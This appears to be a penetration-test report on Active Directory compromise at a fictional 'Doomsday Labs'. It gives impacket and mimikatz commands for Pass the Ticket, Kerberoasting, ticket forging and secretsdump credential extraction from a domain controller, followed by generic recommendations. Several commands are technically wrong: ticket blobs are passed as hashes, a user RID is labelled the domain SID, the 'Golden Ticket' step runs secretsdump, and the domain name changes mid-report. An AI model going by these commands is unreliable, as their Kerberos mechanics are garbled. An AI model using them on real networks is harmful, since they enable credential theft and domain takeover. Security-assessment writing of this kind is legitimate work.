# Active Directory Exploitation Findings

## Overview

This document details the vulnerabilities that were exploited in Active Directory (AD) during the penetration testing of Doomsday Labs' network.

## Technical Details

### Exploitation Techniques
- **Pass the Ticket Attack**:
  - We utilized fabricated Kerberos Ticket Granting Tickets (TGTs) obtained via memory dumps. These tickets were crafted to mimic legitimate user credentials to gain unauthorized access:
    ```
    impacket-ticketer -nthash doIF0jCCBc6g...NXU/rX [shortened for space] -domain-sid S-1-5-21-2774200336-3400690103-1452933870-1111 -domain doomsdaylabs.net da.admin
    ```

- **Kerberoasting**:
  - This method involved targeting service accounts with weak passwords to request their service tickets, which we then attempted to crack offline:
    ```
    impacket-GetUserSPNs doomsdaylabs.net/filemaker -dc-ip 10.100.1.2 -request
    ```

- **Golden Ticket Creation**:
  - After securing domain admin rights, we generated Golden Tickets for persistent, undetected access across the network using:
    ```
    KRB5CCNAME=./Administrator.ccache impacket-secretsdump -k -no-pass -dc-ip 10.100.1.2 -target-ip 10.100.1.2 dc.doomsdaylabs.net
    ```

- **Silver Ticket Attack**:
  - We exploited service account misconfigurations to create Silver Tickets, granting specific service access without full domain compromise:
    ```
    mimikatz # kerberos::golden /user:Administrator /domain:doomsdaylabs.local /sid:S-1-5-21-2774200336-3400690103-1452933870-1111 /krbtgt:doIF0jCCBc6g...NXU/rX [shortened] /service:HTTP /target:webserver.doomsdaylabs.net
    ```

## Impact Assessment

- **Potential Risks**:
  - **Unauthorized Access**: The exploited vulnerabilities could allow unauthorized access to various network resources, potentially leading to data breaches.
  - **Privilege Escalation**: Attackers might escalate their privileges to administrative levels, thereby gaining control over the network.
  - **Persistence**: The creation of Golden and Silver Tickets could allow attackers to maintain persistent access to the network, making detection and remediation difficult.

## Recommendations

- **Strengthen Security Practices**:
  - Regularly update and patch Active Directory to mitigate known vulnerabilities.
  - Conduct comprehensive security audits of Active Directory configurations to ensure they meet security standards.
  - Implement strict access controls and use network segmentation to minimize the risk of exploits.
  - Train IT staff on the latest security threats and defensive tactics to better prepare them for potential attacks.

## Conclusion

Our penetration testing uncovered several critical security issues within Doomsday Labs' Active Directory setup. Promptly addressing these issues and adopting the recommended security measures will significantly enhance the organization's overall security posture.
